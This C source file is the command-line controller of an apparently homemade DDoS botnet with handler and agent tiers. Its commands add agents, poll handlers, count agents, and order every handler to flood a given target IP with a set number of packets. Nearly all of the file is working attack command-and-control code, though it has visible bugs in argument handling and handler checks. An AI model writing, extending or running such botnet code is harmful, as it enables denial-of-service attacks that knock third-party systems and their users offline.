#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "net_sockets.h"
#include "ddos.h"

#define ERROR -1
#define DEFAULT_PKTS_NUMBER 100

typedef enum
{
    CMD_ADD_AGENT = 0,
    CMD_INTERROGATE_HANDLERS = 1,
    CMD_VALIDATE_AGENTS = 2,
    CMD_COUNT_AGENTS = 3,
    CMD_ATTACK = 4,

    CMD_NUMBER = 5, /* Number of availible commands */
}cmd_t;

typedef struct
{
    char *cmd;
    unsigned int args;
    char *usage;
    char *description;
}cmd_data_t;


/* The list of availible commands */
static cmd_data_t commands[CMD_NUMBER] = 
{
    [CMD_ADD_AGENT] = {
        .cmd = "add",
        .args = 2,
        .usage = "add <handler_ip> <agent_ip>",
        .description = "Add Agent to Handler"
    },

    [CMD_INTERROGATE_HANDLERS] = {
        .cmd = "intr",
        .args = 1,
        .usage = "intr <handlers_file>",
        .description = "Interrogate handlers",
    },

    [CMD_VALIDATE_AGENTS] = {
        .cmd = "validate",
        .args = 1,
        .usage = "validate <handlers_file>",
        .description = "Validate Agents",
    },

    [CMD_COUNT_AGENTS] = {
        .cmd = "count",
        .args = 1,
        .usage = "count <handlers_file>",
        .description = "Print the number of availible agents",
    },

    [CMD_ATTACK] = {
        .cmd = "attack",
        .args = 2,
        .usage = "attack <handlers_file> <target_ip> <packets>",
        .description = "Attack the target",
    },
};

/* Print the usage of the programm 
 *      @cmd - print usage for specific command, CMD_NUMBER - print all */
static int print_usage(cmd_t cmd)
{
    int print_all = (cmd == CMD_NUMBER) ? 1 : 0;

    if (print_all)
    {
        fprintf(stderr, "Availible commads:\n");
        cmd = 0;
    }
    for (; cmd < CMD_NUMBER; cmd++)
    {
        fprintf(stderr, "%s\n\tUsage: %s\n", commands[cmd].description,
                commands[cmd].usage);
        if (!print_all)
            break;
    }
    return 1;
}

static cmd_t parse_args(int argc, char *argv[])
{
    cmd_t i;

    if (argc < 2)
    {
        i = CMD_NUMBER;
        goto Exit;
    }

    for (i = 0; i < CMD_NUMBER; i++)
    {
        if (!strcmp(argv[1], commands[i].cmd) &&
                (strlen(argv[1]) == strlen(commands[i].cmd)))
        {
            /* Command was found, checking parametres */
            if ((argc - 2) < commands[i].args)
            {
                /* The number of passed arguments is invalid */
                print_usage(i);
                i = ERROR;
                break;
            }
            break;
        }
    }

Exit:
    if (i == CMD_NUMBER)
    {
        print_usage(i);
        i = ERROR;
    }

    return i;
}

static int interrograte_hanler(int sock, char* handler_ip, void *data)
{
    int version;
    ddos_request_t req = {};
    ddos_responce_t resp = {};

    req.cmd = htons(DDOS_CMD_INTERROGATE_HANDLER);

    send_data(sock, &req, sizeof(ddos_request_t), handler_ip,
            DDOS_HANDL_SRV_PORT);

    if ((recv_data(sock, &resp, sizeof(ddos_responce_t), NULL)) < 0)
        fprintf(stdout, "Hanlder %s is inactive.\n", handler_ip);
    else
    {
        version = ntohs(resp.data);
        fprintf(stdout, "Hanlder %s is active, version %d.\n", handler_ip, version);
    }

    return 0;
}

static int ddns_add_agent(int sock, char *handler_ip, char *agent_ip)
{
    int handler_version;
    ddos_request_t req;
    ddos_responce_t resp;

    handler_version = interrograte_hanler(sock, handler_ip, NULL);
    if (!handler_version)
    {
        fprintf(stderr, "Handler %s is unavailible\n", handler_ip);
        return ERROR;
    }
    fprintf(stdout, "Handler %s is availible. Version %d\n", handler_ip, handler_version);

    req.cmd = htons(DDOS_CMD_ADD_AGENT);
    strcpy(req.ip, agent_ip);

    send_data(sock, &req, sizeof(ddos_request_t), handler_ip,
            DDOS_HANDL_SRV_PORT);

    recv_data(sock, &resp, sizeof(ddos_responce_t), NULL);
    if (ntohs(resp.status) == DDOS_OK)
        fprintf(stderr, "Agent %s was added\n", agent_ip);
    else
        fprintf(stderr, "Agent %s wasn't added %d\n", agent_ip, ntohs(resp.status));

    return 0;
}

static int validate_agents(int sock, char *handler_ip, void *data)
{
    int agents_number;
    ddos_request_t req;
    ddos_responce_t resp;

    req.cmd = htons(DDOS_CMD_INTERROGATE_AGENTS);
    send_data(sock, &req, sizeof(ddos_request_t), handler_ip,
            DDOS_HANDL_SRV_PORT);

    if ((recv_data(sock, &resp, sizeof(ddos_responce_t), NULL)) < 0)
        fprintf(stdout, "Hanlder %s is inactive.\n", handler_ip);
    else
    {
        agents_number = ntohs(resp.data);
        fprintf(stdout, "Hanlder %s is active, agent number: %d.\n",
                handler_ip, agents_number);
    }

    return agents_number;
}

static int count_agents(int sock, char *handler_ip, void *data)
{
    int *agents = data;
    *agents += validate_agents(sock, handler_ip, NULL);

    return 0;
}

static int attack(int sock, char *handler_ip, void *data)
{
    attack_data_t *attack_data = data;
    ddos_request_t req;

    req.cmd = htons(DDOS_CMD_ATTACK);
    req.pkts = htons(attack_data->pkts);
    strcpy(req.ip, attack_data->target_ip);

    send_data(sock, &req, sizeof(ddos_request_t), handler_ip,
            DDOS_HANDL_SRV_PORT);

    return 0;
}

#define VALIDATED_HANDLERS_FILE_NAME "valid_handlers.txt"
typedef int (*action_cb_t)(int sock, char *hanler_ip, void *data);

static int for_each_handler(int sock, char *handlers_file, action_cb_t action_cb,
        void *action_data)
{
    FILE *fp, *valid_fp = NULL;
    char *line = NULL;
    size_t len = 0;
    ssize_t read;
    char ip[16] = {};

    fp = fopen(handlers_file, "r");
    if (fp == NULL)
    {
        fprintf(stderr, "Could not open hanlers file \"%s\".\n", handlers_file);
        goto Error;
    }

    valid_fp = fopen(VALIDATED_HANDLERS_FILE_NAME, "w");
    if (valid_fp == NULL)
    {
        fprintf(stderr, "Could not create valid_hanlers file \"%s\".\n", handlers_file);
        goto Error;
    }

    while ((read = getline(&line, &len, fp)) != ERROR)
    {
        strncpy(ip, line, read - 1);
        action_cb(sock, ip, action_data);
    }

    fclose(fp);
    fclose(valid_fp);

    return 0;

Error:
    if (fp)
        fclose(fp);
    if (valid_fp)
        fclose(valid_fp);
    free(line);

    return ERROR;
}

int main(int argc, char *argv[])
{
    cmd_t cmd;
    int rv = 0, sock, agents = 0, pkts;
    attack_data_t attack_data;

    cmd = parse_args(argc, argv);
    if (cmd == ERROR)
        return 1;

    sock = create_socket(DDOS_CTRL_CLT_PORT, 1000); 
    if (sock == ERROR)
        return 1;

    switch (cmd)
    {
        case CMD_ADD_AGENT:
            rv = ddns_add_agent(sock, argv[2], argv[3]);
            break;
        case CMD_INTERROGATE_HANDLERS:
            rv = for_each_handler(sock, argv[2], interrograte_hanler, NULL);
            break;
        case CMD_VALIDATE_AGENTS:
            rv = for_each_handler(sock, argv[2], validate_agents, NULL);
            break;
        case CMD_COUNT_AGENTS:
            rv = for_each_handler(sock, argv[2], count_agents, &agents);
            break;
        case CMD_ATTACK:
            pkts = (argc > 3) ? atoi(argv[4]) : DEFAULT_PKTS_NUMBER;
            rv = for_each_handler(sock, argv[2], count_agents, &agents);
            attack_data.pkts = pkts / agents;
            attack_data.target_ip = argv[3];
            rv = for_each_handler(sock, argv[2], attack, &attack_data);
            break;
        default:
            break;
    }

    destroy_socket(sock);

    return rv;
}
